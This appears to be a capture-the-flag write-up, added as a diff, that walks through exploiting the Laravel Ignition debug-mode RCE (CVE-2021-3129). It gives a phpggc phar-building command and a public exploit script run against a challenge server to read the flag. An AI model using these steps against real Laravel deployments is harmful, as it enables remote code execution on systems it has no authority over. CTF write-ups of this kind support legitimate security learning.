@@ -1,0 +1,72 @@
+<h2>DAAS</h2>
+
+<blockquote>
+  <p>Solved by: Nigamelastic</p>
+</blockquote>
+
+<ul>
+<li>The hint for this challenge talks about being stuck in debug.</li>
+<li>Some research shows there is a CVE for this, and the Laravel version were working with is vulnerable.</li>
+<li>https://www.exploit-db.com/exploits/49424</li>
+<li>https://www.youtube.com/watch?v=gr8ZKQpYiug&amp;</li>
+</ul>
+
+<p><strong>CVE-2021-3129</strong> : https://nvd.nist.gov/vuln/detail/CVE-2021-3129</p>
+
+<ul>
+<li>Find </li>
+</ul>
+
+<p><code>
+ip/_ignition/execute-solution
+</code></p>
+
+<ul>
+<li>For a laravel panel with error messages and stack trace. </li>
+</ul>
+
+<p><img src="https://i.imgur.com/bwswVCZ.jpg" alt="" /></p>
+
+<ul>
+<li>https://www.ambionics.io/blog/laravel-debug-rce</li>
+<li>As mentioned in the blog above i tried performing a post request but it gave me a 302 response</li>
+<li>but the above link mentions their github page and exploit which is
+<code>https://github.com/ambionics/phpggc</code>
+and 
+<code>https://github.com/ambionics/laravel-exploits</code></li>
+</ul>
+
+<p>the idea is to get the phar file with ur custom command from 1st repo and then put the phar file into the exploit with specified url to run the exploit
+<strong>PS: for a linux command with spaces simply use</strong> <code>"</code> </p>
+
+<ul>
+<li>so for our case since we know the flag was found on the root directory and its name as </li>
+</ul>
+
+<p><code>
+flagM1AhS
+</code></p>
+
+<ul>
+<li>our phpggc command should be</li>
+</ul>
+
+<p><code>bash
+php -d'phar.readonly=0' ./phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system "cat /flagM1AhS"
+</code></p>
+
+<ul>
+<li>run that in the exploit as:</li>
+</ul>
+
+<p><code>bash
+./laravel-ignition-rce.py http://165.227.234.7:31636/ /tmp/exploit.phar
+</code></p>
+
+<ul>
+<li>and we have the flag:</li>
+</ul>
+
+<p><code>
+CHTB{wh3n_7h3_d3bu663r_7urn5_4641n57_7h3_d3bu6633}
+</code></p>
